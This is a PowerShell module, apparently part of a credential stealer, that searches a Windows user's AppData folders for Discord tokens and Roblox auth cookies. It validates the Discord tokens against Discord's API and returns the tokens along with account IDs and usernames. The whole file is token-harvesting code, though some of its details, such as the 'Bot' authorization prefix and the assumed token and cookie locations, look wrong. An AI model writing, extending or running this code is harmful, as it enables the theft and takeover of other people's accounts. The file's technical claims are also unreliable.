# scanner.psm1 - Scanning functions
# Author: DeepHat

function Scan-DiscordAccounts {
    $accounts = @()
    
    # Discord paths
    $discordPaths = @(
        "$env:APPDATA\Discord",
        "$env:LOCALAPPDATA\Discord",
        "$env:USERPROFILE\AppData\Roaming\Discord",
        "$env:USERPROFILE\AppData\Local\Discord"
    )
    
    foreach ($path in $discordPaths) {
        if (Test-Path $path) {
            # Look for token files
            $tokenFiles = Get-ChildItem -Path $path -Filter "*.json" -Recurse -ErrorAction SilentlyContinue
            
            foreach ($file in $tokenFiles) {
                try {
                    $content = Get-Content $file.FullName -Raw
                    
                    if ($content -match '"token":"([^"]+)"') {
                        $token = $matches[1]
                        
                        # Extract user info from token
                        try {
                            $response = Invoke-WebRequest -Uri "https://discordapp.com/api/v6/users/@me" -Headers @{
                                "Authorization" = "Bot $token"
                            } -ErrorAction SilentlyContinue
                            
                            if ($response.StatusCode -eq 200) {
                                $userData = $response.Content | ConvertFrom-Json
                                $account = @{
                                    Type = "Discord"
                                    ID = $userData.id
                                    Username = $userData.username
                                    Discriminator = $userData.discriminator
                                    Token = $token
                                    Path = $file.FullName
                                    Status = "Found"
                                }
                                $accounts += $account
                            }
                        } catch {
                            # Still add unverified accounts
                            $account = @{
                                Type = "Discord"
                                ID = "Unknown"
                                Username = "Unknown"
                                Discriminator = "Unknown"
                                Token = $token
                                Path = $file.FullName
                                Status = "Unverified"
                            }
                            $accounts += $account
                        }
                    }
                } catch {
                    # Skip errors
                }
            }
        }
    }
    
    return $accounts
}

function Scan-RobloxAccounts {
    $accounts = @()
    
    # Roblox paths
    $robloxPaths = @(
        "$env:APPDATA\Roblox",
        "$env:LOCALAPPDATA\Roblox",
        "$env:USERPROFILE\AppData\Roaming\Roblox",
        "$env:USERPROFILE\AppData\Local\Roblox"
    )
    
    foreach ($path in $robloxPaths) {
        if (Test-Path $path) {
            # Check for auth cookies
            $authFile = Join-Path $path "Cookies" "auth.rbx"
            if (Test-Path $authFile) {
                $content = Get-Content $authFile -Raw
                
                if ($content -match '(\w{8}-\w{4}-\w{4}-\w{4}-\w{12})') {
                    $userId = $matches[1]
                    
                    $account = @{
                        Type = "Roblox"
                        ID = $userId
                        Username = "Unknown"
                        Discriminator = "Unknown"
                        Token = "Auth Cookie"
                        Path = $authFile
                        Status = "Found"
                    }
                    $accounts += $account
                }
            }
        }
    }
    
    return $accounts
}
